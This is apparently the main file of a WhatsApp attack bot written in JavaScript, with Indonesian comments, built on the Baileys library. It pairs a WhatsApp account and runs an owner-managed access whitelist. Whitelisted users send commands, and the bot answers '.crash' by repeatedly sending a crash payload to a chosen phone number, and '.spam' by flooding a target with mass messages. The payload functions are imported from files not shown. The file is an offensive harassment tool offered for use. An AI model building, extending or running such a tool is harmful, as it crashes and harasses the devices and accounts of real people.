// index.js - SECURITY & DATABASE UPDATE
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs');
const config = require('./config.js');
const readline = require('readline');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal, blastPMMassal, crashGroup, superBomber } = require('./lib/attack.js');
const { checkAccess, addAccess, removeAccess } = require('./lib/database.js'); // Import Database
const chalk = require('chalk');

let sock = null;
let rl = null;

// FUNCTION INPUT NOMOR
async function askPhoneNumber() {
  if (!rl) {
    rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  
  console.log(chalk.red.bold('\n╔══════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF SECURITY SYSTEM v2.0 🚀       ║'));
  console.log(chalk.red.bold('╚══════════════════════════════════════════════════╝'));
  
  const phoneNumber = await question(
    chalk.yellow('\n📱 MASUKKAN NOMOR WHATSAPP BOT:\n') +
    chalk.cyan('Contoh: 6281234567890\n') +
    chalk.green('Nomor: ')
  );
  return phoneNumber;
}

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    syncFullHistory: false,
    printQRInTerminal: false,
  };
  
  // LOGIKA PAIRING
  let phoneNumber;
  if (config.connectionMethod === 'pairing' && !state.creds.registered) {
    phoneNumber = await askPhoneNumber();
    console.log(chalk.blue(`\n🔗 Memproses data untuk: +${phoneNumber}`));
  }
  
  sock = makeWASocket(socketConfig);

  // FORCE PAIRING CODE
  if (config.connectionMethod === 'pairing' && !sock.authState.creds.registered) {
      console.log(chalk.yellow('⏳ Menunggu server WhatsApp... (3 detik)'));
      setTimeout(async () => {
        try {
            console.log(chalk.cyan('📡 Mengirim request kode pairing...'));
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(chalk.greenBright.bold(`\n🔑 KODE PAIRING: ${code}\n`));
        } catch (err) {
            console.log(chalk.red('❌ Gagal request kode: ' + err.message));
        }
      }, 3000);
  }

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    
    if (qr && config.connectionMethod === 'qr') {
      qrcode.generate(qr, { small: true });
    }
    
    if (connection === 'open') {
      console.log(chalk.green('\n✅ BOT CONNECTED & SECURE!'));
      // Info ke owner saat bot nyala
      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
        text: `🔓 *SYSTEM ONLINE*\n\nBot berhasil terhubung!\nMode Database: ON\nHanya user terdaftar yang bisa akses.` 
      });
    }
    
    // LOGIKA AUTO REMOVE SESSION & RECONNECT
    if (connection === 'close') {
      const reason = lastDisconnect.error?.output?.statusCode;
      const shouldReconnect = reason !== DisconnectReason.loggedOut;

      // Jika LOGGED OUT (Sesi mati/dikeluarkan dari HP), HAPUS SESSION
      if (reason === DisconnectReason.loggedOut) {
          console.log(chalk.red('⛔ Session Logged Out / Corrupt! Menghapus folder session...'));
          fs.rmSync(config.sessionName, { recursive: true, force: true });
          console.log(chalk.yellow('♻️ Silakan jalankan ulang bot untuk scan/pairing baru.'));
          process.exit(1); // Stop script
      } 
      // Jika gangguan sinyal biasa, Sambung Ulang
      else {
          console.log(chalk.yellow(`\n⚠️ Terputus (${reason}), mencoba menyambung kembali...`));
          connectToWhatsApp();
      }
    }
  });
  
  // **MESSAGE HANDLER UTAMA**
  sock.ev.on('messages.upsert', async (m) => {
    try {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || '';
        
        if (!text.startsWith(config.botPrefix)) return;

        const sender = msg.key.remoteJid;
        const senderNumber = sender.replace('@s.whatsapp.net', '');
        const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
        const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
        const pushname = msg.pushName || 'User';
        const isGroup = sender.endsWith('@g.us');

        // IDENTIFIKASI USER
        const isOwner = senderNumber === config.ownerNumber;
        const isAllowed = isOwner || checkAccess(senderNumber);

        console.log(chalk.magenta(`📨 Cmd: ${command} | User: ${senderNumber} | Access: ${isAllowed}`));

        // === FITUR KHUSUS OWNER UNTUK ADD ACCES ===

        if (command === 'acces' || command === 'addaccess') {
            if (!isOwner) return sock.sendMessage(sender, { text: '⛔ Lu bukan Owner gw!' });
            
            let targetUser;
            // Cek jika tag member (@tag)
            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                targetUser = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
            } 
            // Cek jika input nomor manual (62xxx)
            else if (args[0]) {
                targetUser = args[0].replace(/[^0-9]/g, '');
            } else {
                return sock.sendMessage(sender, { text: `Format:\n${config.botPrefix}acces @tag\n${config.botPrefix}acces 628xxxxx` });
            }

            addAccess(targetUser);
            return sock.sendMessage(sender, { text: `✅ SUKSES!\nUser ${targetUser} sekarang bisa menggunakan bot.` });
        }

        else if (command === 'delacces' || command === 'removeaccess') {
            if (!isOwner) return sock.sendMessage(sender, { text: '⛔ Lu bukan Owner gw!' });
            
            let targetUser;
            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                targetUser = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
            } else if (args[0]) {
                targetUser = args[0].replace(/[^0-9]/g, '');
            } else {
                return sock.sendMessage(sender, { text: 'Masukkan target yang mau dihapus aksesnya.' });
            }

            removeAccess(targetUser);
            return sock.sendMessage(sender, { text: `🗑️ Akses user ${targetUser} telah dicabut!` });
        }

        // === PROTEKSI FITUR BOT ===
        // Jika user tidak punya akses, STOP disini
        if (!isAllowed) {
            // Opsional: Balas pesan menolak, atau diamkan saja biar tidak spam
             return sock.sendMessage(sender, { text: '🔒 *ACCESS DENIED*\nLu ga punya akses buat pake bot ini.\nMinta Owner buat ketik .acces nomorlu' });
        }

        // === DAFTAR FITUR (HANYA BISA DIAKSES JIKA WHITELISTED) ===

        if (command === 'menu') {
            await showMenu(sock, sender, pushname);
        }

        else if (command === 'crash') {
            if (!config.enableCrash) return sock.sendMessage(sender, { text: '⚠️ Fitur crash off.' });
            if (!args[0]) return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}crash 628xxxxx` });

            const target = args[0].replace(/\D/g, '');
            const targetJid = `${target}@s.whatsapp.net`;
            
            await sock.sendMessage(sender, { text: `☠️ ATTACKING ${target}...` });

            try {
                const amount = args[1] ? parseInt(args[1]) : config.crashRepeat;
                for (let i = 0; i < amount; i++) {
                    await xeoninvisible(sock, targetJid);
                    console.log(chalk.red(`[💥] Hit ${i+1}/${amount}`));
                    await delay(1500);
                }
                await sock.sendMessage(sender, { text: `✅ Done ${amount}x hit.` });
            } catch (err) {
                await sock.sendMessage(sender, { text: '❌ Failed.' });
            }
        }

        else if (command === 'spam') {
            if (args.length < 3) return sock.sendMessage(sender, { text: 'Format salah.' });
            await spamMassal(sock, args[0] + '@s.whatsapp.net', parseInt(args[1]), args.slice(2).join(' '));
        }

        // FITUR LAINNYA LANJUTKAN DISINI...

    } catch (error) {
        console.error('Handler Error:', error);
    }
  });
  
  return sock;
}

// Start bot
connectToWhatsApp();
